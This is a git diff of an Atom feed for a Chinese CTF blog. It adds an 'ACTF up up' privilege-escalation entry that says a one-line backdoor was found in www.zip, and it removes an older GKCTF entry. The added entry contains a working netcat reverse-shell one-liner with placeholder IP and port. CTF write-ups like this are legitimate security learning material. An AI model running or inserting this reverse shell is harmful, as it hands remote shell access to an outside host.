@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://guokeya.github.io</id>
     <title>过客</title>
-    <updated>2020-06-09T08:14:34.781Z</updated>
+    <updated>2020-06-09T15:13:08.011Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://guokeya.github.io"/>
     <link rel="self" href="https://guokeya.github.io/atom.xml"/>
@@ -10,6 +10,23 @@
     <logo>https://guokeya.github.io/images/avatar.png</logo>
     <icon>https://guokeya.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, 过客</rights>
+    <entry>
+        <title type="html"><![CDATA[ACTF up up(提权)]]></title>
+        <id>https://guokeya.github.io/post/6IpnTQdmW/</id>
+        <link href="https://guokeya.github.io/post/6IpnTQdmW/">
+        </link>
+        <updated>2020-06-09T14:50:54.000Z</updated>
+        <summary type="html"><![CDATA[<p>www.zip下载得到一个一句话的后门<br>
+连接上去。</p>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP port &gt;/tmp/f
+</code></pre>
+]]></summary>
+        <content type="html"><![CDATA[<p>www.zip下载得到一个一句话的后门<br>
+连接上去。</p>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP port &gt;/tmp/f
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[Zer0pts2020]musicblog(绕过CSP。进行请求)]]></title>
         <id>https://guokeya.github.io/post/rFsNvBC3x/</id>
@@ -124,12 +141,5 @@ require_once('lib/session.php');
         <link href="https://guokeya.github.io/post/ldU_lz95g/">
         </link>
         <updated>2020-05-26T15:38:41.000Z</updated>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[GKCTF2020]EZ三剑客-EzNode(settime溢出+沙盒逃逸)]]></title>
-        <id>https://guokeya.github.io/post/a45x0caHd/</id>
-        <link href="https://guokeya.github.io/post/a45x0caHd/">
-        </link>
-        <updated>2020-05-25T01:03:30.000Z</updated>
     </entry>
 </feed>
